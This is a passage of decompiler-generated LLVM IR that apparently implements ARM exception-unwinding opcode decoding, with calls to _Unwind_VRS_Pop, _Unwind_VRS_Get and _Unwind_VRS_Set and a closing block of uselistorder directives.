  %v0_18764 = load i32, i32* %r2.global-to-local, align 4
  %v1_18764 = load i32, i32* %r3.global-to-local, align 4
  %v4_18764 = mul i32 %v1_18764, 4096
  %v5_18764 = or i32 %v4_18764, %v0_18764
  br label %dec_label_pc_18768

dec_label_pc_18768:                               ; preds = %dec_label_pc_18718, %dec_label_pc_1874c
  %storemerge130 = phi i32 [ %v5_18764, %dec_label_pc_1874c ], [ 720897, %dec_label_pc_18718 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1857c

dec_label_pc_18770:                               ; preds = %dec_label_pc_1849c
  %v0_18770 = load i32, i32* @r5, align 4
  %v1_18770 = add i32 %v0_18770, 8
  %v2_18770 = inttoptr i32 %v1_18770 to i8*
  %v3_18770 = load i8, i8* %v2_18770, align 1
  %v4_18770 = zext i8 %v3_18770 to i32
  store i32 %v4_18770, i32* %r3.global-to-local, align 4
  %v2_18774 = icmp eq i8 %v3_18770, 0
  store i1 %v2_18774, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18774, label %dec_label_pc_1891c, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_18770
  %v2_18778 = add nsw i32 %v4_18770, -1
  store i32 %v2_18778, i32* %r3.global-to-local, align 4
  %v2_1877c = trunc i32 %v2_18778 to i8
  store i8 %v2_1877c, i8* %v2_18770, align 1
  %v0_18780.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18780.pr.pr, label %.thread56.dec_label_pc_1891c_crit_edge, label %dec_label_pc_18784

.thread56.dec_label_pc_1891c_crit_edge:           ; preds = %.thread56
  %v0_1891c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1891c

dec_label_pc_18784:                               ; preds = %.thread56, %dec_label_pc_18928
  %v0_18784 = load i32, i32* %r0.global-to-local, align 4
  %v3_18784 = udiv i32 %v0_18784, 16777216
  store i32 %v3_18784, i32* %r3.global-to-local, align 4
  store i32 %v3_18784, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_18784, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_1878c = mul i32 %v0_18784, 256
  store i32 %v3_1878c, i32* %r0.global-to-local, align 4
  %v1_18790 = load i32, i32* @r5, align 4
  %v2_18790 = inttoptr i32 %v1_18790 to i32*
  store i32 %v3_1878c, i32* %v2_18790, align 4
  br i1 %tmp184, label %dec_label_pc_1854c, label %dec_label_pc_18798

dec_label_pc_18798:                               ; preds = %dec_label_pc_18784
  %v0_18798 = load i32, i32* %r3.global-to-local, align 4
  %v1_18798 = and i32 %v0_18798, 240
  store i32 %v1_18798, i32* %r3.global-to-local, align 4
  %v2_18798 = icmp eq i32 %v1_18798, 0
  store i1 %v2_18798, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18798, label %dec_label_pc_187a0, label %dec_label_pc_1854c

dec_label_pc_187a0:                               ; preds = %dec_label_pc_18798
  %v0_187a0 = load i32, i32* @r7, align 4
  store i32 %v0_187a0, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_187a8 = load i32, i32* %r2.global-to-local, align 4
  %v4_187a8 = call i32 @_Unwind_VRS_Pop(i32 %v0_187a0, i32 4, i32 %v2_187a8, i32 0)
  store i32 %v4_187a8, i32* %r0.global-to-local, align 4
  %v2_187ac = icmp eq i32 %v4_187a8, 0
  store i1 %v2_187ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_187ac, label %dec_label_pc_1827c.backedge, label %dec_label_pc_187b4

dec_label_pc_187b4:                               ; preds = %dec_label_pc_187a0
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183a4

dec_label_pc_187bc:                               ; preds = %dec_label_pc_185e8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_187c8 = load i32, i32* @r7, align 4
  store i32 %v0_187c8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_187d4 = call i32 @_Unwind_VRS_Get(i32 %v0_187c8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_187d4, i32* %r0.global-to-local, align 4
  %v0_187d8 = load i32, i32* @r5, align 4
  %v1_187d8 = add i32 %v0_187d8, 8
  %v2_187d8 = inttoptr i32 %v1_187d8 to i8*
  %v3_187d8 = load i8, i8* %v2_187d8, align 1
  %v4_187d8 = zext i8 %v3_187d8 to i32
  store i32 %v4_187d8, i32* %r1.global-to-local, align 4
  %v2_187dc = icmp eq i8 %v3_187d8, 0
  store i1 %v2_187dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_187dc, label %dec_label_pc_187ec, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_187bc
  %v2_187e0 = add nsw i32 %v4_187d8, -1
  store i32 %v2_187e0, i32* %r3.global-to-local, align 4
  %v2_187e4 = trunc i32 %v2_187e0 to i8
  store i8 %v2_187e4, i8* %v2_187d8, align 1
  %v0_187e8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_187e8.pr.pr, label %.thread58.dec_label_pc_187ec_crit_edge, label %dec_label_pc_18818

.thread58.dec_label_pc_187ec_crit_edge:           ; preds = %.thread58
  %v0_187ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_187ec

dec_label_pc_187ec:                               ; preds = %.thread58.dec_label_pc_187ec_crit_edge, %dec_label_pc_187bc
  %v2_18800 = phi i32 [ %v0_187ec.pre, %.thread58.dec_label_pc_187ec_crit_edge ], [ %v0_187d8, %dec_label_pc_187bc ]
  %v1_187ec = add i32 %v2_18800, 9
  %v2_187ec = inttoptr i32 %v1_187ec to i8*
  %v3_187ec = load i8, i8* %v2_187ec, align 1
  %v4_187ec = zext i8 %v3_187ec to i32
  store i32 %v4_187ec, i32* %r3.global-to-local, align 4
  %v2_187f0 = icmp eq i8 %v3_187ec, 0
  store i1 %v2_187f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_187f0, label %bb158, label %dec_label_pc_187fc

bb158:                                            ; preds = %dec_label_pc_187ec
  %v1_187f4 = load i32, i32* @r6, align 4
  store i32 %v1_187f4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18840

dec_label_pc_187fc:                               ; preds = %dec_label_pc_187ec
  %v1_187fc = add nsw i32 %v4_187ec, -1
  store i32 %v1_187fc, i32* %r3.global-to-local, align 4
  %v1_18800 = trunc i32 %v1_187fc to i8
  store i8 %v1_18800, i8* %v2_187ec, align 1
  %v0_18804 = load i32, i32* @r5, align 4
  %v1_18804 = add i32 %v0_18804, 4
  %v2_18804 = inttoptr i32 %v1_18804 to i32*
  %v3_18804 = load i32, i32* %v2_18804, align 4
  store i32 %v3_18804, i32* %r2.global-to-local, align 4
  %v1_18808 = inttoptr i32 %v3_18804 to i32*
  %v2_18808 = load i32, i32* %v1_18808, align 4
  store i32 %v2_18808, i32* %r0.global-to-local, align 4
  %v4_18808 = add i32 %v3_18804, 4
  store i32 %v4_18808, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_18810 = inttoptr i32 %v0_18804 to i32*
  store i32 %v2_18808, i32* %v1_18810, align 4
  %v5_18810 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18810, i32* %v2_18804, align 4
  %v0_18814 = load i32, i32* %r3.global-to-local, align 4
  %v1_18814 = trunc i32 %v0_18814 to i8
  %v2_18814 = load i32, i32* @r5, align 4
  %v3_18814 = add i32 %v2_18814, 8
  %v4_18814 = inttoptr i32 %v3_18814 to i8*
  store i8 %v1_18814, i8* %v4_18814, align 1
  br label %dec_label_pc_18818

dec_label_pc_18818:                               ; preds = %.thread58, %dec_label_pc_187fc
  %v0_18818 = load i32, i32* @r5, align 4
  %v1_18818 = inttoptr i32 %v0_18818 to i32*
  %v2_18818 = load i32, i32* %v1_18818, align 4
  store i32 %v2_18818, i32* %r3.global-to-local, align 4
  %v3_1881c = mul i32 %v2_18818, 256
  store i32 %v3_1881c, i32* %r0.global-to-local, align 4
  %v3_18820 = udiv i32 %v2_18818, 16777216
  store i32 %v3_18820, i32* %r2.global-to-local, align 4
  store i32 %v3_1881c, i32* %v1_18818, align 4
  %v0_18828 = load i32, i32* %r2.global-to-local, align 4
  %v1_18828 = and i32 %v0_18828, 128
  %v2_18828 = icmp eq i32 %v1_18828, 0
  store i1 %v2_18828, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18828, label %.thread129, label %dec_label_pc_1883c

.thread129:                                       ; preds = %dec_label_pc_18818
  %v4_1882c = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_1882c, i32* %ip.global-to-local, align 4
  %v1_18830 = urem i32 %v0_18828, 256
  store i32 %v1_18830, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_188b0

dec_label_pc_1883c:                               ; preds = %dec_label_pc_18818
  %v1_1883063 = urem i32 %v0_18828, 256
  store i32 %v1_1883063, i32* %r2.global-to-local, align 4
  %v0_1883c = load i32, i32* @r5, align 4
  %v1_1883c = add i32 %v0_1883c, 8
  %v2_1883c = inttoptr i32 %v1_1883c to i8*
  %v3_1883c = load i8, i8* %v2_1883c, align 1
  %v4_1883c = zext i8 %v3_1883c to i32
  store i32 %v4_1883c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18840

dec_label_pc_18840:                               ; preds = %bb158, %dec_label_pc_1883c
  %v3_1886099 = phi i32 [ %v2_18800, %bb158 ], [ %v0_1883c, %dec_label_pc_1883c ]
  %v0_1884892 = phi i32 [ %v1_187f4, %bb158 ], [ %v1_1883063, %dec_label_pc_1883c ]
  %v3_18840 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_18840, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_18848

dec_label_pc_18848:                               ; preds = %dec_label_pc_18848.backedge, %dec_label_pc_18840
  %v3_18860 = phi i32 [ %v3_18860100, %dec_label_pc_18848.backedge ], [ %v3_1886099, %dec_label_pc_18840 ]
  %v0_1885c = phi i32 [ %v2_1884c.pre, %dec_label_pc_18848.backedge ], [ 2, %dec_label_pc_18840 ]
  %v0_1884c = phi i32 [ %v0_1884c.pre, %dec_label_pc_18848.backedge ], [ %v3_18840, %dec_label_pc_18840 ]
  %v0_18848 = phi i32 [ %v0_1884895, %dec_label_pc_18848.backedge ], [ %v0_1884892, %dec_label_pc_18840 ]
  %v1_18848 = urem i32 %v0_18848, 128
  %v7_1884c = shl i32 %v1_18848, %v0_1885c
  %v8_1884c = add i32 %v7_1884c, %v0_1884c
  store i32 %v8_1884c, i32* %ip.global-to-local, align 4
  %v0_18850 = load i32, i32* %r1.global-to-local, align 4
  %v2_18850 = icmp eq i32 %v0_18850, 0
  store i1 %v2_18850, i1* %cpsr_z.global-to-local, align 1
  %v1_18854 = add i32 %v0_18850, -1
  store i32 %v1_18854, i32* %r3.global-to-local, align 4
  store i32 %v8_1884c, i32* %stack_var_-36, align 4
  %v1_1885c = add i32 %v0_1885c, 7
  store i32 %v1_1885c, i32* @lr, align 4
  br i1 %v2_18850, label %dec_label_pc_18868, label %bb159

bb159:                                            ; preds = %dec_label_pc_18848
  %v2_18860 = trunc i32 %v1_18854 to i8
  %v4_18860 = add i32 %v3_18860, 8
  %v5_18860 = inttoptr i32 %v4_18860 to i8*
  store i8 %v2_18860, i8* %v5_18860, align 1
  %v0_18864.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18864.pr, label %.dec_label_pc_18868_crit_edge, label %dec_label_pc_18894

.dec_label_pc_18868_crit_edge:                    ; preds = %bb159
  %v0_18868.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18868

dec_label_pc_18868:                               ; preds = %.dec_label_pc_18868_crit_edge, %dec_label_pc_18848
  %v2_18880 = phi i32 [ %v0_18868.pre, %.dec_label_pc_18868_crit_edge ], [ %v3_18860, %dec_label_pc_18848 ]
  %v1_18868 = add i32 %v2_18880, 9
  %v2_18868 = inttoptr i32 %v1_18868 to i8*
  %v3_18868 = load i8, i8* %v2_18868, align 1
  %v4_18868 = zext i8 %v3_18868 to i32
  store i32 %v4_18868, i32* %r3.global-to-local, align 4
  %v2_1886c = icmp eq i8 %v3_18868, 0
  store i1 %v2_1886c, i1* %cpsr_z.global-to-local, align 1
  %v1_18870 = add nsw i32 %v4_18868, -1
  store i32 %v1_18870, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_1886c, label %dec_label_pc_18848.backedge, label %dec_label_pc_1887c

dec_label_pc_1887c:                               ; preds = %dec_label_pc_18868
  %v1_1887c = add i32 %v2_18880, 4
  %v2_1887c = inttoptr i32 %v1_1887c to i32*
  %v3_1887c = load i32, i32* %v2_1887c, align 4
  store i32 %v3_1887c, i32* %r2.global-to-local, align 4
  %v1_18880 = trunc i32 %v1_18870 to i8
  store i8 %v1_18880, i8* %v2_18868, align 1
  %v0_18884 = load i32, i32* %r2.global-to-local, align 4
  %v1_18884 = inttoptr i32 %v0_18884 to i32*
  %v2_18884 = load i32, i32* %v1_18884, align 4
  store i32 %v2_18884, i32* %r0.global-to-local, align 4
  %v4_18884 = add i32 %v0_18884, 4
  store i32 %v4_18884, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_1888c = load i32, i32* @r5, align 4
  %v3_1888c = add i32 %v2_1888c, 8
  %v4_1888c = inttoptr i32 %v3_1888c to i8*
  store i8 3, i8* %v4_1888c, align 1
  %v0_18890 = load i32, i32* @r5, align 4
  %v1_18890 = inttoptr i32 %v0_18890 to i32*
  %v2_18890 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_18890, i32* %v1_18890, align 4
  %v3_18890 = add i32 %v0_18890, 4
  %v4_18890 = inttoptr i32 %v3_18890 to i32*
  %v5_18890 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_18890, i32* %v4_18890, align 4
  br label %dec_label_pc_18894

dec_label_pc_18894:                               ; preds = %bb159, %dec_label_pc_1887c
  %v0_18894 = load i32, i32* @r5, align 4
  %v1_18894 = inttoptr i32 %v0_18894 to i32*
  %v2_18894 = load i32, i32* %v1_18894, align 4
  store i32 %v2_18894, i32* %r3.global-to-local, align 4
  %v3_18898 = udiv i32 %v2_18894, 16777216
  store i32 %v3_18898, i32* %r2.global-to-local, align 4
  %v1_1889c = and i32 %v3_18898, 128
  %v2_1889c = icmp eq i32 %v1_1889c, 0
  store i1 %v2_1889c, i1* %cpsr_z.global-to-local, align 1
  %v3_188a0 = mul i32 %v2_18894, 256
  store i32 %v3_188a0, i32* %r0.global-to-local, align 4
  store i32 %v3_188a0, i32* %v1_18894, align 4
  %v0_188a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_188a8 = urem i32 %v0_188a8, 256
  store i32 %v1_188a8, i32* %r2.global-to-local, align 4
  br i1 %v2_1889c, label %dec_label_pc_188b0.loopexit, label %dec_label_pc_188dc

dec_label_pc_188b0.loopexit:                      ; preds = %dec_label_pc_18894
  %v0_188b4.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_188b8.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_188b0

dec_label_pc_188b0:                               ; preds = %dec_label_pc_188b0.loopexit, %.thread129
  %v2_188b8 = phi i32 [ 2, %.thread129 ], [ %v2_188b8.pre, %dec_label_pc_188b0.loopexit ]
  %v0_188b4 = phi i32 [ %v4_1882c, %.thread129 ], [ %v0_188b4.pre, %dec_label_pc_188b0.loopexit ]
  %v0_188b0 = phi i32 [ %v1_18830, %.thread129 ], [ %v1_188a8, %dec_label_pc_188b0.loopexit ]
  %v1_188b0 = urem i32 %v0_188b0, 128
  %v1_188b4 = add i32 %v0_188b4, 516
  %v7_188b8 = shl i32 %v1_188b0, %v2_188b8
  %v8_188b8 = add i32 %v1_188b4, %v7_188b8
  store i32 %v8_188b8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_188c0 = load i32, i32* @r7, align 4
  store i32 %v0_188c0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_188b8, i32* %stack_var_-36, align 4
  %v5_188d4 = call i32 @_Unwind_VRS_Set(i32 %v0_188c0, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_188d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1827c.backedge

dec_label_pc_188dc:                               ; preds = %dec_label_pc_18894
  %v0_188dc = load i32, i32* @r5, align 4
  %v1_188dc = add i32 %v0_188dc, 8
  %v2_188dc = inttoptr i32 %v1_188dc to i8*
  %v3_188dc = load i8, i8* %v2_188dc, align 1
  %v4_188dc = zext i8 %v3_188dc to i32
  store i32 %v4_188dc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18848.backedge

dec_label_pc_18848.backedge:                      ; preds = %dec_label_pc_188dc, %dec_label_pc_18868
  %v3_18860100 = phi i32 [ %v0_188dc, %dec_label_pc_188dc ], [ %v2_18880, %dec_label_pc_18868 ]
  %v0_1884895 = phi i32 [ %v1_188a8, %dec_label_pc_188dc ], [ 176, %dec_label_pc_18868 ]
  %v0_1884c.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_1884c.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_18848

dec_label_pc_188e4:                               ; preds = %dec_label_pc_185e0
  %v0_188e4 = load i32, i32* @r5, align 4
  %v1_188e4 = add i32 %v0_188e4, 8
  %v2_188e4 = inttoptr i32 %v1_188e4 to i8*
  %v3_188e4 = load i8, i8* %v2_188e4, align 1
  %v4_188e4 = zext i8 %v3_188e4 to i32
  store i32 %v4_188e4, i32* %r3.global-to-local, align 4
  %v2_188e8 = icmp eq i8 %v3_188e4, 0
  store i1 %v2_188e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_188e8, label %dec_label_pc_1894c, label %.thread66

.thread66:                                        ; preds = %dec_label_pc_188e4
  %v2_188ec = add nsw i32 %v4_188e4, -1
  store i32 %v2_188ec, i32* %r3.global-to-local, align 4
  %v2_188f0 = trunc i32 %v2_188ec to i8
  store i8 %v2_188f0, i8* %v2_188e4, align 1
  %v0_188f4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_188f4.pr.pr, label %.thread66.dec_label_pc_1894c_crit_edge, label %dec_label_pc_188f8

.thread66.dec_label_pc_1894c_crit_edge:           ; preds = %.thread66
  %v0_1894c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1894c

dec_label_pc_188f8:                               ; preds = %.thread66, %dec_label_pc_18958
  %v0_188f8 = load i32, i32* %r0.global-to-local, align 4
  %v3_188f8 = udiv i32 %v0_188f8, 16777216
  store i32 %v3_188f8, i32* %r3.global-to-local, align 4
  store i32 %v3_188f8, i32* %r2.global-to-local, align 4
  %tmp185 = icmp ult i32 %v0_188f8, 16777216
  store i1 %tmp185, i1* %cpsr_z.global-to-local, align 1
  %v3_18900 = mul i32 %v0_188f8, 256
  store i32 %v3_18900, i32* %r0.global-to-local, align 4
  %v1_18904 = load i32, i32* @r5, align 4
  %v2_18904 = inttoptr i32 %v1_18904 to i32*
  store i32 %v3_18900, i32* %v2_18904, align 4
  br i1 %tmp185, label %dec_label_pc_1854c, label %dec_label_pc_1890c

dec_label_pc_1890c:                               ; preds = %dec_label_pc_188f8
  %v0_1890c = load i32, i32* %r3.global-to-local, align 4
  %v1_1890c = and i32 %v0_1890c, 240
  store i32 %v1_1890c, i32* %r1.global-to-local, align 4
  %v2_1890c = icmp eq i32 %v1_1890c, 0
  store i1 %v2_1890c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1890c, label %dec_label_pc_1890c.dec_label_pc_1857c_crit_edge, label %dec_label_pc_18914

dec_label_pc_1890c.dec_label_pc_1857c_crit_edge:  ; preds = %dec_label_pc_1890c
  %v2_18584.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1857c

dec_label_pc_18914:                               ; preds = %dec_label_pc_1890c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_183a4

dec_label_pc_1891c:                               ; preds = %.thread56.dec_label_pc_1891c_crit_edge, %dec_label_pc_18770
  %v2_1892c = phi i32 [ %v0_1891c.pre, %.thread56.dec_label_pc_1891c_crit_edge ], [ %v0_18770, %dec_label_pc_18770 ]
  %v1_1891c = add i32 %v2_1892c, 9
  %v2_1891c = inttoptr i32 %v1_1891c to i8*
  %v3_1891c = load i8, i8* %v2_1891c, align 1
  %v4_1891c = zext i8 %v3_1891c to i32
  store i32 %v4_1891c, i32* %r3.global-to-local, align 4
  %v2_18920 = icmp eq i8 %v3_1891c, 0
  store i1 %v2_18920, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18920, label %dec_label_pc_1854c, label %dec_label_pc_18928

dec_label_pc_18928:                               ; preds = %dec_label_pc_1891c
  %v1_18928 = add nsw i32 %v4_1891c, -1
  store i32 %v1_18928, i32* %r3.global-to-local, align 4
  %v1_1892c = trunc i32 %v1_18928 to i8
  store i8 %v1_1892c, i8* %v2_1891c, align 1
  %v0_18930 = load i32, i32* @r5, align 4
  %v1_18930 = add i32 %v0_18930, 4
  %v2_18930 = inttoptr i32 %v1_18930 to i32*
  %v3_18930 = load i32, i32* %v2_18930, align 4
  store i32 %v3_18930, i32* %r2.global-to-local, align 4
  %v1_18934 = inttoptr i32 %v3_18930 to i32*
  %v2_18934 = load i32, i32* %v1_18934, align 4
  store i32 %v2_18934, i32* %r0.global-to-local, align 4
  %v4_18934 = add i32 %v3_18930, 4
  store i32 %v4_18934, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18934, i32* %v2_18930, align 4
  %v0_18940 = load i32, i32* %r3.global-to-local, align 4
  %v1_18940 = trunc i32 %v0_18940 to i8
  %v2_18940 = load i32, i32* @r5, align 4
  %v3_18940 = add i32 %v2_18940, 8
  %v4_18940 = inttoptr i32 %v3_18940 to i8*
  store i8 %v1_18940, i8* %v4_18940, align 1
  %v0_18944 = load i32, i32* %r0.global-to-local, align 4
  %v1_18944 = load i32, i32* @r5, align 4
  %v2_18944 = inttoptr i32 %v1_18944 to i32*
  store i32 %v0_18944, i32* %v2_18944, align 4
  br label %dec_label_pc_18784

dec_label_pc_1894c:                               ; preds = %.thread66.dec_label_pc_1894c_crit_edge, %dec_label_pc_188e4
  %v2_1895c = phi i32 [ %v0_1894c.pre, %.thread66.dec_label_pc_1894c_crit_edge ], [ %v0_188e4, %dec_label_pc_188e4 ]
  %v1_1894c = add i32 %v2_1895c, 9
  %v2_1894c = inttoptr i32 %v1_1894c to i8*
  %v3_1894c = load i8, i8* %v2_1894c, align 1
  %v4_1894c = zext i8 %v3_1894c to i32
  store i32 %v4_1894c, i32* %r3.global-to-local, align 4
  %v2_18950 = icmp eq i8 %v3_1894c, 0
  store i1 %v2_18950, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18950, label %dec_label_pc_1854c, label %dec_label_pc_18958

dec_label_pc_18958:                               ; preds = %dec_label_pc_1894c
  %v1_18958 = add nsw i32 %v4_1894c, -1
  store i32 %v1_18958, i32* %r3.global-to-local, align 4
  %v1_1895c = trunc i32 %v1_18958 to i8
  store i8 %v1_1895c, i8* %v2_1894c, align 1
  %v0_18960 = load i32, i32* @r5, align 4
  %v1_18960 = add i32 %v0_18960, 4
  %v2_18960 = inttoptr i32 %v1_18960 to i32*
  %v3_18960 = load i32, i32* %v2_18960, align 4
  store i32 %v3_18960, i32* %r2.global-to-local, align 4
  %v1_18964 = inttoptr i32 %v3_18960 to i32*
  %v2_18964 = load i32, i32* %v1_18964, align 4
  store i32 %v2_18964, i32* %r0.global-to-local, align 4
  %v4_18964 = add i32 %v3_18960, 4
  store i32 %v4_18964, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_18964, i32* %v2_18960, align 4
  %v0_18970 = load i32, i32* %r3.global-to-local, align 4
  %v1_18970 = trunc i32 %v0_18970 to i8
  %v2_18970 = load i32, i32* @r5, align 4
  %v3_18970 = add i32 %v2_18970, 8
  %v4_18970 = inttoptr i32 %v3_18970 to i8*
  store i8 %v1_18970, i8* %v4_18970, align 1
  %v0_18974 = load i32, i32* %r0.global-to-local, align 4
  %v1_18974 = load i32, i32* @r5, align 4
  %v2_18974 = inttoptr i32 %v1_18974 to i32*
  store i32 %v0_18974, i32* %v2_18974, align 4
  br label %dec_label_pc_188f8

; uselistorder directives
  uselistorder i32 %v3_18900, { 1, 0 }
  uselistorder i1 %tmp185, { 1, 0 }
  uselistorder i32 %v3_188f8, { 1, 0 }
  uselistorder i32 %v0_188f8, { 1, 0, 2 }
  uselistorder i32 %v1_188a8, { 1, 2, 0 }
  uselistorder i32 %v3_188a0, { 1, 0 }
  uselistorder i32 %v3_18898, { 1, 0 }
  uselistorder i32 %v2_18880, { 2, 0, 1 }
  uselistorder i32 %v1_1883063, { 1, 0 }
  uselistorder i32 %v1_18830, { 1, 0 }
  uselistorder i32 %v3_1881c, { 1, 0 }
  uselistorder i32 %v2_18818, { 1, 0, 2 }
  uselistorder i32 %v3_1878c, { 1, 0 }
  uselistorder i1 %tmp184, { 1, 0 }
  uselistorder i32 %v3_18784, { 1, 0 }
  uselistorder i32 %v0_18784, { 1, 0, 2 }
  uselistorder i32 %storemerge130, { 1, 0 }
  uselistorder i32 %v3_18754, { 1, 0 }
  uselistorder i32 %storemerge131, { 1, 0 }
  uselistorder i32 %v3_186e8, { 1, 0 }
  uselistorder i32 %v0_18690, { 3, 2, 1, 0 }
  uselistorder i32 %v2_18688, { 1, 0 }
  uselistorder i32 %v2_18680, { 1, 0 }
  uselistorder i32 %storemerge132, { 1, 0 }
  uselistorder i32 %v3_18648, { 1, 0 }
  uselistorder i32 %v0_18580, { 2, 1, 0 }
  uselistorder i32 %v1_18560, { 1, 0 }
  uselistorder i32 %v0_18494, { 1, 0 }
  uselistorder i32 %v0_18480, { 1, 0, 2, 3 }
  uselistorder i1 %v2_18418, { 1, 0 }
  uselistorder i32 %v1_18414, { 2, 1, 0 }
  uselistorder i32 %storemerge135, { 1, 0 }
  uselistorder i32 %v3_183b4, { 1, 0 }
  uselistorder i32 %v4_1838c, { 1, 0 }
  uselistorder i1 %v2_1837c, { 1, 0 }
  uselistorder i32 %v3_18348, { 1, 0 }
  uselistorder i32 %v3_18330, { 1, 0 }
  uselistorder i32 %v0_182d4, { 0, 6, 1, 8, 5, 2, 7, 3, 4, 9, 10 }
  uselistorder i32 %v3_182c4, { 1, 0 }
  uselistorder i32 %v3_182bc, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 2, 3, 4, 5, 0, 6, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 61, 56, 57, 58, 59, 60, 62, 63, 64, 65, 66, 67, 68, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 69, 70, 71, 72, 0, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 41, 29, 30, 31, 32, 33, 34, 35, 36, 37, 43, 44, 38, 45, 46, 47, 48, 49, 1, 2, 39, 40, 42, 50, 51, 52, 53, 3, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 1, 16, 17, 18, 19, 12, 13, 14, 15, 20, 21, 23, 22, 24, 25, 26, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 56, 15, 8, 9, 10, 11, 12, 13, 14, 18, 16, 17, 27, 19, 20, 57, 21, 58, 22, 23, 24, 59, 25, 26, 31, 61, 32, 33, 34, 38, 36, 37, 41, 39, 40, 35, 28, 60, 29, 30, 42, 44, 43, 46, 45, 47, 49, 48, 50, 51, 65, 52, 53, 62, 54, 55, 63, 64, 0, 1 }
  uselistorder i32* %ip.global-to-local, { 2, 1, 3, 4, 5, 6, 8, 9, 10, 0, 7, 11, 12 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 25, 26, 27, 28, 29, 30, 31, 32, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67 }
  uselistorder i32 262144, { 2, 0, 1 }
  uselistorder i32 524288, { 2, 3, 1, 0 }
  uselistorder i32 208, { 1, 0 }
